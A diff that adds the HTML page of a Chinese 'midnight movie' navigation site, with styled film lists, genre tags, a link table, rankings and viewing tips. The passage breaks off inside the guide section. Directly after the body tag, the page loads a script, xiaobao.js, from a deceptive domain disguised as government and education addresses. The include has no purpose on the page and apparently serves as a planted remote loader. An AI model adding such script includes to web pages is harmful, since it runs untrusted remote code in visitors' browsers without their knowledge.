@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="午夜电影网福利（网址 wuyedianyingwangfuli-cn.github.io）是午夜影视网址导航：深夜片单、悬疑惊悚、黑色电影、独立片、冷门佳作与观影福利的实用网址收录。">
+<meta name="keywords" content="午夜电影网福利,午夜电影网,午夜电影,深夜电影,悬疑片,惊悚片,黑色电影,犯罪片,独立电影,冷门佳作,电影网站导航,影视网址大全">
+<meta name="author" content="午夜电影网福利">
+<meta name="robots" content="index,follow">
+<title>午夜电影网福利 - 午夜影视网址导航与深夜片单 | 实用网址收录</title>
+<style>
+:root{
+  --mid:#07090f; --mid2:#0e1320; --ink:#e9ecf2; --ink2:#a9b3c6;
+  --violet:#7b5cff; --plum:#c13bff; --lime:#c4ff3d; --teal:#2ee6c8; --rust:#ff5b3d;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--mid);color:var(--ink);line-height:1.9;
+  background-image:linear-gradient(rgba(196,255,61,.028) 1px,transparent 1px),linear-gradient(90deg,rgba(196,255,61,.028) 1px,transparent 1px);
+  background-size:14px 14px;overflow-x:hidden}
+a{color:inherit;text-decoration:none;outline:none}
+ul,ol,dl,details{list-style:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 26px}
+::selection{background:var(--lime);color:#05070a}
+
+/* 顶部：霓虹招牌条 */
+.marq{background:var(--mid2);border-bottom:1px solid rgba(123,92,255,.35);padding:8px 0;overflow:hidden;position:relative}
+.marq::after{content:"";position:absolute;left:0;right:0;top:0;height:2px;background:linear-gradient(90deg,var(--violet),var(--plum),var(--lime),var(--teal),var(--rust));background-size:200% 100%;animation:mr 5s linear infinite}
+@keyframes mr{to{background-position:200% 0}}
+.marq .wr{display:flex;gap:34px;white-space:nowrap;font-size:10.4px;letter-spacing:2.6px;color:var(--ink2);font-weight:700}
+.marq b{color:var(--lime)}
+
+/* 报头 */
+.mast{display:flex;justify-content:space-between;align-items:flex-end;gap:22px;padding:28px 0 20px}
+.brand{display:flex;align-items:center;gap:15px;flex-wrap:wrap}
+.neon{width:60px;height:60px;flex-shrink:0;position:relative;border-radius:13px;background:var(--mid);
+  box-shadow:inset 0 0 0 2.4px var(--lime),inset 0 0 22px rgba(196,255,61,.28),0 0 26px rgba(196,255,61,.3)}
+.neon i{position:absolute;inset:9px;border-radius:9px;background:repeating-linear-gradient(135deg,var(--violet) 0 5px,var(--plum) 5px 10px);animation:ne 3.6s steps(12) infinite}
+@keyframes ne{to{filter:hue-rotate(360deg)}
+  }
+.neon span{position:absolute;inset:0;display:grid;place-items:center;font-size:15px;font-weight:900;color:var(--lime);text-shadow:0 0 9px var(--lime);z-index:2;letter-spacing:1px}
+.brand h1{font-size:clamp(30px,7vw,62px);font-weight:900;line-height:1.06;letter-spacing:2px}
+.brand h1 em{font-style:normal;color:var(--lime)}
+.brand .sub{font-size:12px;color:var(--ink2);margin-top:9px;letter-spacing:1.4px}
+.brand .sub b{color:var(--rust)}
+.clock{text-align:right;font-family:monospace;font-size:11px;color:var(--teal);letter-spacing:2px;flex-shrink:0}
+.clock strong{display:block;font-size:24px;color:var(--lime);letter-spacing:3px;font-weight:900;text-shadow:0 0 14px rgba(196,255,61,.5)}
+.clock .dot{color:var(--rust);animation:bl 1s step-end infinite}
+@keyframes bl{50%{opacity:0}}
+
+/* 导航：荧光标签页 */
+nav.toc{display:flex;gap:0;flex-wrap:wrap;position:sticky;top:0;z-index:30;background:rgba(7,9,15,.94);backdrop-filter:blur(6px);
+  border:1px solid rgba(123,92,255,.3);border-radius:0 0 14px 14px}
+nav.toc a{flex:1;min-width:88px;text-align:center;padding:13px 6px;font-size:11.8px;font-weight:900;color:var(--ink2);letter-spacing:1.4px;
+  border-bottom:2px solid transparent;transition:.2s}
+nav.toc a:hover{color:var(--teal)}
+nav.toc a.on{color:var(--mid);background:var(--lime);border-bottom-color:var(--lime)}
+
+/* Hero */
+.hero{padding:34px 0 44px}
+.hero-c{display:grid;grid-template-columns:1.05fr .95fr;gap:28px;align-items:center}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:10.2px;font-weight:900;color:var(--mid);background:var(--lime);
+  padding:6px 14px;border-radius:999px;letter-spacing:2.4px}
+.eyebrow::before{content:"●";color:var(--rust);animation:bl 1.2s step-end infinite}
+.hero h2{font-size:clamp(25px,4.9vw,42px);font-weight:900;line-height:1.36;margin:14px 0 12px;letter-spacing:.6px}
+.hero h2 u{text-decoration:none;color:var(--lime);text-shadow:0 0 18px rgba(196,255,61,.45)}
+.hero p{font-size:14.6px;color:var(--ink2);max-width:560px}
+.hero p b{color:var(--teal)}
+
+/* 六切口卡：div + svg 示波 */
+.cut{display:grid;grid-template-columns:repeat(2,1fr);gap:0;border:1px solid rgba(123,92,255,.4);background:var(--mid2)}
+.cut .c{padding:16px 18px;border-right:1px solid rgba(123,92,255,.22);border-bottom:1px solid rgba(123,92,255,.22);position:relative;transition:.24s}
+.cut .c:nth-child(2n){border-right:none}
+.cut .c:nth-last-child(-n+2){border-bottom:none}
+.cut .c:hover{background:rgba(196,255,61,.05)}
+.cut .c .no{font-family:monospace;font-size:9.4px;color:var(--lime);letter-spacing:2.4px;font-weight:900}
+.cut .c h4{font-size:15.2px;font-weight:900;margin:3px 0 5px;display:flex;justify-content:space-between;gap:8px;align-items:baseline}
+.cut .c h4 i{font-style:normal;font-size:8.4px;color:var(--rust);border:1px solid var(--rust);padding:2px 8px;letter-spacing:.6px;font-weight:900}
+.cut .c p{font-size:11.4px;color:var(--ink2)}
+.cut .c svg{position:absolute;right:14px;top:14px;width:34px;height:20px;opacity:.85}
+
+/* 通用标题 */
+section{padding:30px 0}
+.sec-h{display:flex;align-items:center;gap:12px;margin-bottom:18px;flex-wrap:wrap}
+.sec-h .no{font-size:10px;font-weight:900;color:var(--mid);background:var(--lime);width:31px;height:31px;display:grid;place-items:center;border-radius:9px;font-family:monospace}
+.sec-h h3{font-size:20px;font-weight:900;letter-spacing:1.3px}
+.sec-h h3 em{font-style:normal;color:var(--lime)}
+.sec-h .rule{flex:1;height:1px;background:linear-gradient(90deg,var(--violet),transparent);margin-left:6px}
+.sec-h .more{font-size:11.2px;color:var(--ink2);font-weight:900}
+.sec-h .more:hover{color:var(--lime)}
+
+/* 片单：figure 竖版票根 */
+.films{display:grid;grid-template-columns:repeat(4,1fr);gap:17px}
+.fcard{background:var(--mid2);border:1px solid rgba(123,92,255,.35);transition:.26s;position:relative;overflow:hidden}
+.fcard:hover{border-color:var(--lime);box-shadow:0 0 0 1px var(--lime),0 8px 30px -14px var(--lime);transform:translateY(-4px)}
+.fcard .cv{aspect-ratio:3/4;position:relative;display:grid;place-items:center;text-align:center;font-weight:900;font-size:15px;letter-spacing:1.4px;color:#fff;padding:14px}
+.fcard .cv::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent 0 7px,rgba(0,0,0,.18) 7px 8px)}
+.v1{background:linear-gradient(155deg,#3a1d6b,#1a0e33)}
+.v2{background:linear-gradient(155deg,#7a1f4f,#30101f)}
+.v3{background:linear-gradient(155deg,#0f4f5e,#07222a)}
+.v4{background:linear-gradient(155deg,#4f3a12,#241a05)}
+.v5{background:linear-gradient(155deg,#2b3a6b,#111a33)}
+.v6{background:linear-gradient(155deg,#5e1f1f,#2b0c0c)}
+.v7{background:linear-gradient(155deg,#1f5e3a,#0a2417)}
+.v8{background:linear-gradient(155deg,#5a2f6b,#241233)}
+.fcard .cv .no{position:absolute;left:9px;top:9px;font-family:monospace;font-size:9.6px;color:var(--lime);background:rgba(0,0,0,.5);padding:4px 9px;z-index:2;letter-spacing:.6px}
+.fcard .cv .badge{position:absolute;right:-1px;bottom:12px;font-size:8.6px;font-weight:900;color:var(--mid);background:var(--lime);padding:6px 12px;letter-spacing:.8px;z-index:2}
+.fcard figcaption{padding:12px 15px 15px}
+.fcard h4{font-size:14.4px;font-weight:900;display:flex;justify-content:space-between;gap:7px;align-items:baseline}
+.fcard h4 i{font-style:normal;font-size:8.2px;color:var(--teal);border:1px solid var(--teal);padding:2px 7px;flex-shrink:0;font-weight:900;letter-spacing:.6px}
+.fcard p{font-size:11.6px;color:var(--ink2);margin-top:5px}
+.fcard .tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:9px}
+.fcard .tags a{font-size:9.2px;color:var(--ink2);border:1px solid rgba(169,179,198,.4);padding:3px 9px;font-weight:900;border-radius:999px}
+.fcard .tags a:hover{color:var(--mid);background:var(--lime);border-color:var(--lime)}
+
+/* 分类：dl 术语 */
+.cat{background:var(--mid2);border:1px solid rgba(123,92,255,.35);padding:2px 24px}
+.cat .row{display:grid;grid-template-columns:240px 1fr;gap:18px;padding:15px 4px;border-bottom:1px dashed rgba(169,179,198,.26)}
+.cat .row:last-child{border-bottom:none}
+.cat dt{font-weight:900;font-size:13.8px;display:flex;flex-direction:column;gap:5px;color:var(--ink)}
+.cat dt b{font-size:9.4px;color:var(--mid);font-weight:900;background:var(--lime);padding:5px 12px;align-self:flex-start;letter-spacing:1.6px;font-family:monospace;border-radius:999px}
+.cat dt span{font-size:11.2px;color:var(--ink2);font-weight:500}
+.cat dd{display:flex;flex-wrap:wrap;gap:9px;align-content:center}
+.cat dd a{padding:6px 15px;background:var(--mid);font-size:12.2px;color:var(--ink2);font-weight:900;border:1px solid rgba(46,230,200,.35);border-radius:999px}
+.cat dd a:hover{color:var(--mid);background:var(--teal);border-color:var(--teal)}
+
+/* 网址收录：table */
+.sites{background:var(--mid2);border:1px solid rgba(123,92,255,.35);overflow:hidden}
+.sites table{width:100%;border-collapse:collapse;font-size:12.2px}
+.sites th{background:var(--lime);color:var(--mid);text-align:left;padding:13px 18px;font-size:10.2px;letter-spacing:2.2px;font-weight:900}
+.sites td{padding:13px 18px;border-bottom:1px solid rgba(169,179,198,.16);vertical-align:middle;color:var(--ink2)}
+.sites tr:last-child td{border-bottom:none}
+.sites tbody tr:nth-child(even){background:rgba(123,92,255,.05)}
+.sites tbody tr:hover{background:rgba(196,255,61,.07)}
+.sites .u{font-weight:900;color:var(--ink);font-size:13.4px}
+.sites .u small{display:block;font-size:9.8px;color:var(--ink2);font-weight:500;margin-top:2px;font-family:monospace}
+.pill{font-size:9px;padding:5px 11px;font-weight:900;white-space:nowrap;border:1px solid;letter-spacing:.8px;border-radius:999px}
+.p1{color:var(--lime);border-color:var(--lime)}
+.p2{color:var(--teal);border-color:var(--teal)}
+.p3{color:var(--plum);border-color:var(--plum)}
+.p4{color:var(--rust);border-color:var(--rust)}
+.go{color:var(--lime);font-weight:900;font-size:12.4px}
+.go:hover{color:var(--teal);text-decoration:underline}
+
+/* 热播榜：ol + 进度条 + 侧栏 */
+.rank{display:grid;grid-template-columns:1.42fr 1fr;gap:24px;align-items:start}
+.board{background:var(--mid2);border:1px solid rgba(123,92,255,.35);padding:6px 24px 24px}
+.board h5{font-size:14.4px;color:var(--lime);padding:16px 0 11px;border-bottom:1px solid var(--violet);margin-bottom:15px;display:flex;justify-content:space-between;font-weight:900}
+.board h5 a{font-size:11px;color:var(--ink2);font-weight:900}
+.board ol{counter-reset:r;display:flex;flex-direction:column;gap:15px}
+.board li{counter-increment:r;display:grid;grid-template-columns:54px 1fr;gap:13px;align-items:start}
+.board li::before{content:"午 "counter(r,"0");font-weight:900;font-size:10.4px;color:var(--mid);background:var(--lime);width:52px;height:48px;display:grid;place-items:center;font-family:monospace}
+.board li:nth-child(2)::before{background:var(--teal)}
+.board li:nth-child(3)::before{background:var(--plum);color:#fff}
+.board b{font-size:13.8px;display:block}
+.board p{font-size:11px;color:var(--ink2)}
+.bar-i{height:5px;background:rgba(233,236,242,.14);margin-top:10px;overflow:hidden;border-radius:999px}
+.bar-i i{display:block;height:100%;border-radius:999px;background:linear-gradient(90deg,var(--violet),var(--plum),var(--lime));transform-origin:left;animation:st 2.2s ease-in-out infinite alternate}
+@keyframes st{to{transform:scaleX(.55)}}
+.trend{display:inline-block;font-size:9px;font-weight:900;color:var(--teal);border:1px solid var(--teal);padding:3px 10px;margin-top:6px;border-radius:999px;letter-spacing:.8px}
+
+.pick{display:flex;flex-direction:column;gap:16px}
+.pick article{background:var(--mid2);border:1px solid rgba(123,92,255,.35);overflow:hidden;transition:.22s}
+.pick article:hover{border-color:var(--lime)}
+.pick .ph{aspect-ratio:16/8.4;display:grid;place-items:center;text-align:center;font-weight:900;font-size:14px;letter-spacing:1.5px;color:#fff;position:relative}
+.pick .ph::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(90deg,transparent 0 11px,rgba(196,255,61,.06) 11px 12px)}
+.pick figcaption{padding:13px 16px}
+.pick h6{font-size:13.6px;display:flex;justify-content:space-between;gap:8px;font-weight:900}
+.pick h6 span{font-size:8.6px;font-weight:900;color:var(--mid);background:var(--lime);padding:4px 11px;flex-shrink:0;font-family:monospace;border-radius:999px}
+.pick p{font-size:11.6px;color:var(--ink2);margin-top:4px}
+
+/* 指南：手风琴 */
+.guide{background:linear-gradient(150deg,var(--mid2),#0a0f1c);border:1px solid rgba(123,92,255,.4);padding:25px 29px}
+.guide h4{font-size:16.4px;margin-bottom:15px;color:var(--lime);font-weight:900}
+.guide details{border-bottom:1px solid rgba(169,179,198,.22);padding:13px 0}
+.guide details:last-child{border-bottom:none}
+.guide summary{cursor:pointer;font-weight:900;font-size:13.8px;display:flex;justify-content:space-between;align-items:center;gap:12px;list-style:none;color:var(--ink)}
+.guide summary::-webkit-details-marker{display:none}
+.guide summary::after{content:"＋";color:var(--lime);font-size:19px;transition:.22s;flex-shrink:0;font-weight:400}
+.guide details[open] summary::after{content:"－"}
+.guide p{font-size:12.8px;color:var(--ink2);padding-top:10px;line-height:1.94}
+.guide p b{color:var(--teal)}
+
+/* 关于 */
+.about{background:linear-gradient(135deg,rgba(123,92,255,.1),rgba(46,230,200,.06));border:1px solid rgba(123,92,255,.4);padding:34px;
+  box-shadow:0 0 0 1px rgba(196,255,61,.18),0 0 60px -30px var(--lime)}
+.about .k{font-size:9.8px;letter-spacing:3px;color:var(--mid);background:var(--lime);font-weight:900;display:inline-block;padding:7px 15px;border-radius:999px;margin-bottom:13px}
+.about h2{font-size:24px;margin-bottom:13px;letter-spacing:1.2px;font-weight:900}
+.about h2 em{font-style:normal;color:var(--lime)}
+.about p{font-size:14.6px;color:var(--ink2);max-width:900px}
+.about p b{color:var(--teal)}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-top:26px}
+.stats div{background:var(--mid2);border:1px solid rgba(123,92,255,.35);padding:16px;text-align:center}
+.stats b{display:block;font-size:26px;color:var(--lime);font-weight:900}
+.stats span{font-size:11.2px;color:var(--ink2)}
+
+/* Footer */
+footer.ft{padding:42px 0 22px;margin-top:36px;border-top:1px solid var(--violet);color:var(--ink2)}
+.fgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;margin-bottom:26px}
+.fgrid h6{font-size:13.6px;margin-bottom:14px;color:var(--lime);letter-spacing:1.6px;font-weight:900}
+.fgrid ul{display:flex;flex-direction:column;gap:8px;font-size:12.4px}
+.fgrid a:hover{color:var(--lime);text-decoration:underline;text-underline-offset:3px}
+.copy{text-align:center;font-size:11.8px;color:var(--ink2);border-top:1px dashed rgba(169,179,198,.26);padding-top:20px;line-height:1.95}
+.copy b{color:var(--lime)}
+.up{position:fixed;right:16px;bottom:20px;width:52px;height:52px;background:var(--lime);color:var(--mid);display:grid;place-items:center;z-index:60;font-size:16px;font-weight:900;border-radius:50%;box-shadow:0 0 20px rgba(196,255,61,.4)}
+
+@media (max-width:1080px){.films{grid-template-columns:repeat(3,1fr)}}
+@media (max-width:1000px){.hero-c,.rank{grid-template-columns:1fr}.cut{grid-template-columns:1fr}}
+@media (max-width:760px){
+  .wrap{padding:0 16px}
+  section{padding:24px 0}
+  .cat .row{grid-template-columns:1fr;gap:9px}
+  .sites{overflow-x:auto}
+  .sites table{min-width:800px}
+  .films{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:560px){
+  .stats,.fgrid{grid-template-columns:repeat(2,1fr)}
+  .clock,.marq .r{display:none}
+  .sec-h h3{font-size:16.6px}
+  .about{padding:24px}
+  .guide{padding:20px 16px}
+  .brand h1{font-size:33px;letter-spacing:1px}
+  .fcard .cv{aspect-ratio:3/4}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="marq">
+  <div class="wr">
+    <span><b>午夜电影网福利</b> ｜ wuyedianyingwangfuli-cn.github.io</span>
+    <span>深夜片单 · 悬疑惊悚 · 黑色电影 · 独立片 · 冷门佳作 · 观影福利</span>
+    <span>影视网址导航 ｜ 实用网址收录</span>
+  </div>
+</div>
+
+<header class="wrap">
+  <div class="mast">
+    <div class="brand">
+      <div class="neon"><i></i><span>午夜</span></div>
+      <div>
+        <h1><em>午夜</em>电影网福利</h1>
+        <div class="sub">深夜片单 · 悬疑 / 惊悚 / 黑色电影 / 独立片 · <b>一次点准，不绕路</b></div>
+      </div>
+    </div>
+    <div class="clock"><span id="c">00:00:00</span><strong><span class="dot">●</span> 午夜场</strong></div>
+  </div>
+</header>
+
+<nav class="toc wrap" aria-label="栏目导航">
+  <a class="on" href="#films">片单</a>
+  <a href="#cat">类型</a>
+  <a href="#sites">网址收录</a>
+  <a href="#rank">热播榜</a>
+  <a href="#guide">观影指南</a>
+  <a href="#about">关于</a>
+</nav>
+
+<header class="hero">
+  <div class="wrap">
+    <div class="hero-c">
+      <div>
+        <span class="eyebrow">NOW SHOWING · 午夜场已开灯</span>
+        <h2>天黑之后，<u>只看对的片子</u></h2>
+        <p><b>午夜电影网福利</b>把影视入口按<b>六个深夜切口</b>整理：<b>悬疑惊悚、黑色电影、犯罪片、心理片、独立片、冷门佳作</b>。<b>一次点击直达</b>，不搬运、不绕路、无诱导。</p>
+      </div>
+
+      <aside class="cut" aria-label="午夜六个切口">
+        <div class="c"><div class="no">CUT / 01</div><h4>悬疑惊悚 <i>反转</i></h4><p>信息差、倒计时、不可信的叙事者。</p>
+          <svg viewBox="0 0 34 20"><path d="M0 10 L4 10 L6 4 L8 16 L10 10 L34 10" fill="none" stroke="#c4ff3d" stroke-width="1.5"/></svg></div>
+        <div class="c"><div class="no">CUT / 02</div><h4>黑色电影 <i>宿命</i></h4><p>雨夜、香烟、注定走错的那一步。</p>
+          <svg viewBox="0 0 34 20"><path d="M0 14 L5 6 L10 14 L15 6 L20 14 L25 6 L30 14 L34 10" fill="none" stroke="#2ee6c8" stroke-width="1.5"/></svg></div>
+        <div class="c"><div class="no">CUT / 03</div><h4>犯罪片 <i>动机</i></h4><p>谁做的不是重点，为什么做才是。</p>
+          <svg viewBox="0 0 34 20"><path d="M0 4 L8 4 L8 16 L16 16 L16 4 L24 4 L24 16 L34 16" fill="none" stroke="#c13bff" stroke-width="1.5"/></svg></div>
+        <div class="c"><div class="no">CUT / 04</div><h4>心理片 <i>视角</i></h4><p>镜头就是角色的知觉，不可靠即真实。</p>
+          <svg viewBox="0 0 34 20"><path d="M0 10 Q8 2 17 10 T34 10" fill="none" stroke="#ff5b3d" stroke-width="1.5"/></svg></div>
+        <div class="c"><div class="no">CUT / 05</div><h4>独立片 <i>作者</i></h4><p>小成本、长镜头、一句台词说十年。</p>
+          <svg viewBox="0 0 34 20"><path d="M0 12 L6 12 L6 8 L12 8 L12 12 L34 12" fill="none" stroke="#7b5cff" stroke-width="1.5"/></svg></div>
+        <div class="c"><div class="no">CUT / 06</div><h4>冷门佳作 <i>二刷</i></h4><p>评分不高，但看完会坐很久。</p>
+          <svg viewBox="0 0 34 20"><path d="M0 6 L11 6 L11 14 L22 14 L22 6 L34 6" fill="none" stroke="#c4ff3d" stroke-width="1.5"/></svg></div>
+      </aside>
+    </div>
+  </div>
+</header>
+
+<main>
+
+  <section id="films">
+    <div class="wrap">
+      <div class="sec-h"><span class="no">01</span><h3>深夜片单 · <em>八部，刚好一晚</em></h3><span class="rule"></span><a class="more" href="#">完整片单 ›</a></div>
+      <div class="films">
+        <figure class="fcard"><div class="cv v1">密闭空间<small>COUNTDOWN</small><span class="no">M.01</span><span class="badge">倒计时</span></div><figcaption><h4>倒计时 <i>一镜</i></h4><p>把所有人物关进一个房间，让时间替导演剪片子。</p><div class="tags"><a href="#">密闭</a><a href="#">实时</a><a href="#">反转</a></div></figcaption></figure>
+        <figure class="fcard"><div class="cv v2">不可靠叙事<small>UNRELIABLE</small><span class="no">M.02</span><span class="badge">叙事诡计</span></div><figcaption><h4>叙事诡计 <i>视角</i></h4><p>你看到的不是真相，是角色想让你看到的。</p><div class="tags"><a href="#">叙述者</a><a href="#">结构</a><a href="#">细节</a></div></figcaption></figure>
+        <figure class="fcard"><div class="cv v3">雨夜黑色<small>NOIR</small><span class="no">M.03</span><span class="badge">宿命</span></div><figcaption><h4>雨夜黑色 <i>光影</i></h4><p>顶光、百叶窗、湿路面——罪从影子里长出来。</p><div class="tags"><a href="#">光影</a><a href="#">宿命</a><a href="#">对白</a></div></figcaption></figure>
+        <figure class="fcard"><div class="cv v4">追凶<small>MANHUNT</small><span class="no">M.04</span><span class="badge">双线</span></div><figcaption><h4>追凶双线 <i>节奏</i></h4><p>警察与凶手各走一半，最后在同一条街相遇。</p><div class="tags"><a href="#">双线</a><a href="#">时间线</a><a href="#">留白</a></div></figcaption></figure>
+        <figure class="fcard"><div class="cv v5">心理迷宫<small>MAZE</small><span class="no">M.05</span><span class="badge">长镜头</span></div><figcaption><h4>心理迷宫 <i>知觉</i></h4><p>镜头就是记忆：重复、错位、突然失焦。</p><div class="tags"><a href="#">长镜头</a><a href="#">梦境</a><a href="#">配乐</a></div></figcaption></figure>
+        <figure class="fcard"><div class="cv v6">犯罪动机<small>MOTIVE</small><span class="no">M.06</span><span class="badge">冷硬</span></div><figcaption><h4>犯罪动机 <i>冷硬</i></h4><p>不拍凶案，只拍凶案之后每个人怎么撒谎。</p><div class="tags"><a href="#">群像</a><a href="#">对白</a><a href="#">道德</a></div></figcaption></figure>
+        <figure class="fcard"><div class="cv v7">极简独立<small>INDIE</small><span class="no">M.07</span><span class="badge">作者</span></div><figcaption><h4>极简独立 <i>留白</i></h4><p>三个人、一句台词、一个长镜头，讲完一生。</p><div class="tags"><a href="#">小成本</a><a href="#">作者</a><a href="#">克制</a></div></figcaption></figure>
+        <figure class="fcard"><div class="cv v8">冷门佳作<small>HIDDEN</small><span class="no">M.08</span><span class="badge">二刷</span></div><figcaption><h4>冷门佳作 <i>余味</i></h4><p>评分不高，但片尾字幕走完你还坐着。</p><div class="tags"><a href="#">冷门</a><a href="#">余味</a><a href="#">推荐</a></div></figcaption></figure>
+      </div>
+    </div>
+  </section>
+
+  <section id="cat">
+    <div class="wrap">
+      <div class="sec-h"><span class="no">02</span><h3>类型表 · <em>午夜片单关键词</em></h3><span class="rule"></span><a class="more" href="#">完整类型 ›</a></div>
+      <div class="cat">
+        <div class="row"><dt><b>午/01</b>悬疑惊悚<span>Suspense / Thriller</span></dt><dd>
+          <a href="#">倒计时</a><a href="#">密闭空间</a><a href="#">不可靠叙事</a><a href="#">反转</a><a href="#">信息差</a>
+        </dd></div>
+        <div class="row"><dt><b>午/02</b>黑色电影<span>Film Noir</span></dt><dd>
+          <a href="#">雨夜</a><a href="#">宿命</a><a href="#">顶光</a><a href="#">道德灰色</a><a href="#">硬汉对白</a>
+        </dd></div>
+        <div class="row"><dt><b>午/03</b>犯罪片<span>Crime</span></dt><dd>
+          <a href="#">追凶</a><a href="#">动机</a><a href="#">双线叙事</a><a href="#">时间线</a><a href="#">群像</a>
+        </dd></div>
+        <div class="row"><dt><b>午/04</b>心理片<span>Psychological</span></dt><dd>
+          <a href="#">知觉</a><a href="#">梦境</a><a href="#">记忆</a><a href="#">长镜头</a><a href="#">失焦</a>
+        </dd></div>
+        <div class="row"><dt><b>午/05</b>恐怖片<span>Horror</span></dt><dd>
+          <a href="#">氛围</a><a href="#">留白</a><a href="#">声音</a><a href="#">伪纪录片</a><a href="#">民俗</a>
+        </dd></div>
+        <div class="row"><dt><b>午/06</b>独立与冷门<span>Indie / Hidden</span></dt><dd>
+          <a href="#">小成本</a><a href="#">作者导演</a><a href="#">克制</a><a href="#">二刷</a><a href="#">片单</a>
+        </dd></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="sites">
+    <div class="wrap">
+      <div class="sec-h"><span class="no">03</span><h3>网址收录 · <em>影视网址大全</em></h3><span class="rule"></span><a class="more" href="#">提交网址 ›</a></div>
+      <div class="sites">
+        <table>
+          <thead><tr><th style="width:24%">网站 / 入口</th><th style="width:36%">收录说明</th><th style="width:16%">切口</th><th style="width:13%">状态</th><th style="width:11%">访问</th></tr></thead>
+          <tbody>
+            <tr><td class="u">午夜电影网福利<small>wuyedianyingwangfuli-cn.github.io</small></td><td>午夜影视网址导航：悬疑惊悚、黑色电影、犯罪片、心理片、独立片、冷门佳作的实用网址收录</td><td><span class="pill p1">导航首页</span></td><td>正常</td><td><a class="go" href="#">进入 ›</a></td></tr>
+            <tr><td class="u">悬疑惊悚 · 倒计时片单<small>SUSPENSE</small></td><td>密闭空间、不可靠叙事、反转与信息差，按“第几分钟会反转”排序</td><td><span class="pill p2">悬疑</span></td><td>正常</td><td><a class="go" href="#">进入 ›</a></td></tr>
+            <tr><td class="u">黑色电影 · 雨夜与香烟<small>NOIR</small></td><td>顶光、百叶窗、湿路面：黑色电影的光影与宿命母题</td><td><span class="pill p3">黑色</span></td><td>更新中</td><td><a class="go" href="#">进入 ›</a></td></tr>
+            <tr><td class="u">犯罪片 · 追凶双线<small>CRIME</small></td><td>警察与凶手各走一半：动机、时间线、群像对白</td><td><span class="pill p4">犯罪</span></td><td>正常</td><td><a class="go" href="#">进入 ›</a></td></tr>
+            <tr><td class="u">心理片 · 镜头即知觉<small>PSYCHO</small></td><td>长镜头、梦境、记忆与失焦：镜头如何替角色说话</td><td><span class="pill p2">心理</span></td><td>正常</td><td><a class="go" href="#">进入 ›</a></td></tr>
+            <tr><td class="u">独立片 / 冷门佳作<small>INDIE / HIDDEN</small></td><td>小成本、作者导演、克制留白，片尾字幕走完还坐着的那些</td><td><span class="pill p1">冷门</span></td><td>正常</td><td><a class="go" href="#">进入 ›</a></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank">
+    <div class="wrap">
+      <div class="sec-h"><span class="no">04</span><h3>热播榜 · <b>本周午夜热度</b></h3><span class="rule"></span><a class="more" href="#">完整榜单 ›</a></div>
+      <div class="rank">
+        <div class="board">
+          <h5><span>本周 午夜电影网福利 热播榜</span><a href="#">换一批 ›</a></h5>
+          <ol>
+            <li><div><b>悬疑惊悚：倒计时</b><p>把所有人物关进一个房间，让时间替导演剪片子</p><span class="trend">↑ 21</span><i class="bar-i"><i style="width:96%"></i></i></div></li>
+            <li><div><b>黑色电影：雨夜宿命</b><p>顶光、百叶窗、湿路面——罪从影子里长出来</p><span class="trend">↑ 16</span><i class="bar-i"><i style="width:88%"></i></i></div></li>
+            <li><div><b>犯罪片：追凶双线</b><p>警察与凶手各走一半，最后在同一条街相遇</p><span class="trend">↑ 12</span><i class="bar-i"><i style="width:77%"></i></i></div></li>
+            <li><div><b>心理片：镜头即知觉</b><p>长镜头、梦境、记忆与失焦，镜头替角色说话</p><span class="trend">↑ 10</span><i class="bar-i"><i style="width:64%"></i></i></div></li>
+            <li><div><b>恐怖片：留白比尖叫有效</b><p>不拍鬼，只拍“以为看到了”的那两秒</p><span class="trend">新</span><i class="bar-i"><i style="width:52%"></i></i></div></li>
+            <li><div><b>独立片：一句台词说十年</b><p>三个人、一个长镜头，讲完一生</p><span class="trend">↑ 8</span><i class="bar-i"><i style="width:42%"></i></i></div></li>
+          </ol>
+        </div>
+        <aside class="pick">
+          <article><div class="ph v5">🎬 21 天午夜片单</div><figcaption><h6>每晚一部，按情绪排 <span>21 夜</span></h6><p>悬疑 → 黑色 → 犯罪 → 心理 → 独立，越看越清醒。</p></figcaption></article>
+          <article><div class="ph v3">🕯️ 午夜观片三原则</div><figcaption><h6>天黑之后的规矩 <span>3 条</span></h6><p>关灯、戴耳机、不查评分——先被骗，再复盘。</p></figcaption></article>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+  <section id="guide">
+    <div class="wrap">
+      <div class="sec-h"><span class="no">05</span><h3>观影指南 · <em>午夜怎么选片</em></h3><span class="rule"></span><a class="more" href="#">完整指南 ›</a></div>
+      <div class="guide">
+        <h4>🎞️ 在 午夜电影网福利，把一晚过得像一场放映</h4>
+        <details open><summary><span>先定情绪，再定类型</span></summary><p>睡不着要看<b>悬疑</b>，想被治愈要看<b>独立</b>，想看清人性要看<b>黑色</b>，想被吓到要看<b>留白</b>。<b>类型不是分类，是承诺</b>。</p></details>
+        <details><summary><span>看懂反转的三秒钟</span></summary><p>反转发生前，一定有<b>一个被忽略的细节</b>。重看时只盯道具、对白、时间线——导演早就告诉你了。</p></details>
+        <details><summary><span>黑色电影看光影</span></summary><p>顶光把人脸切成两半，百叶窗投在墙上，雨把路灯拉成一条线。<b>光就是道德立场</b>。</p></details>
+        <details><summary><span>心理片看镜头</span></summary><p>长镜头 = 不给喘息；手持 = 主观知觉；失焦 = 记忆不可信。<b>镜头不是记录，是角色的脑子</b>。</p></details>
